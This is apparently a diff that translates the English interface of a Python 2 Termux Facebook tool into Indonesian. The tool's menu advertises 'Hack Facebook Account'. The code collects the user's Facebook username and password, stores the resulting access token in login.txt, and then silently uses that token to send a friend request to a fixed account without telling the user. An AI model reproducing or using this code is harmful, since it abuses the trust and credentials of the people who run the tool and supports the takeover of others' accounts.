@@ -39,7 +39,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mMohon Tunggu \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(0.01)
 
@@ -75,9 +75,9 @@ def login():
         os.system('clear')
         print logo
         print 52 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
-        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
-        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN KE FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername or Email \x1b[1;91m:\x1b[1;92m ')
+        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mKata Sandi \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
             br.open('https://m.facebook.com')
@@ -105,7 +105,7 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Sukses Bossku'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 time.sleep(1)
                 menu()
@@ -161,13 +161,13 @@ def menu():
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (39 - len(id)) * '\x1b[1;97m ' + '║'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (39 - len(sub)) * '\x1b[1;97m ' + '║'
     print '\x1b[1;97m╠' + 50 * '\xe2\x95\x90' + '╝'
-    print '║-> \x1b[1;37;40m1. User Information'
-    print '║-> \x1b[1;37;40m2. Hack Facebook Account'
+    print '║-> \x1b[1;37;40m1. Informasi Akun Teman'
+    print '║-> \x1b[1;37;40m2. Retas Akun FB'
     print '║-> \x1b[1;37;40m3. Bot'
-    print '║-> \x1b[1;37;40m4. Others'
-    print '║-> \x1b[1;37;40m5. Update'
-    print '║-> \x1b[1;37;40m6. Logout'
-    print '║-> \x1b[1;31;40m0. Exit'
+    print '║-> \x1b[1;37;40m4. Lainnya'
+    print '║-> \x1b[1;37;40m5. Perbarui Skrip'
+    print '║-> \x1b[1;37;40m6. Keluar Akun'
+    print '║-> \x1b[1;31;40m0. Exit Termux'
     print '\x1b[1;37;40m║'
     pilih()
 
@@ -175,7 +175,7 @@ def menu():
 def pilih():
     zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if zedd == '':
-        print '\x1b[1;91m[!] Can\'t empty'
+        print '\x1b[1;91m[!] Pilih Angkanya Boss'
         pilih()
     else:
         if zedd == '1':
@@ -195,12 +195,12 @@ def pilih():
                             print logo
                             print 52 * '\x1b[1;97m\xe2\x95\x90'
                             os.system('git pull origin master')
-                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                             menu()
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://m.facebook.com/rizz.magizz')
+				os.system('xdg-open https://m.facebook.com/RizalTzansa')
                                 keluar()
                             else:
                                 if zedd == '0':
@@ -215,7 +215,7 @@ def informasi():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print '\x1b[1;91m[!] Token tidak ditemukan'
         os.system('rm -rf login.txt')
         time.sleep(0.01)
         login()
